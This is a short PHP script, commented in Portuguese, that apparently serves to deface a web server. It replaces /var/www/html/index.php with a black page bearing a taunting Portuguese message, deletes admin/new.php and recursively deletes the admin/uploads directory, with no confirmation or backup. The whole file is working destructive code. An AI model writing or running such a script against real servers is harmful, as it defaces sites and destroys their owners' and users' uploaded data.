<?php
// Caminho do index.php
$indexFile = '/var/www/html/index.php';

// Conteúdo HTML com a mensagem desejada
$htmlContent = <<<'HTML'
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Página Atualizada</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            background-color: black;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-family: Arial, sans-serif;
        }
    </style>
</head>
<body>
    <h1>oi lindo, hackea ai pra mim?</h1>
</body>
</html>
HTML;

// Atualizando index.php
if (file_put_contents($indexFile, $htmlContent) !== false) {
    echo "index.php atualizado com sucesso!\n";
} else {
    echo "Erro ao atualizar index.php. Verifique permissões.\n";
}

// Caminho do arquivo a ser removido
$newFile = '/var/www/html/admin/new.php';
if (file_exists($newFile)) {
    if (unlink($newFile)) {
        echo "Arquivo new.php removido com sucesso.\n";
    } else {
        echo "Falha ao remover new.php. Verifique permissões.\n";
    }
} else {
    echo "Arquivo new.php não existe.\n";
}

// Caminho da pasta uploads a ser removida
$uploadsDir = '/var/www/html/admin/uploads';

// Função para remover diretório recursivamente
function removeDir($dir) {
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $path = "$dir/$file";
        is_dir($path) ? removeDir($path) : unlink($path);
    }
    return rmdir($dir);
}

if (is_dir($uploadsDir)) {
    if (removeDir($uploadsDir)) {
        echo "Pasta uploads removida com sucesso.\n";
    } else {
        echo "Falha ao remover uploads. Verifique permissões.\n";
    }
} else {
    echo "Pasta uploads não existe.\n";
}
?>
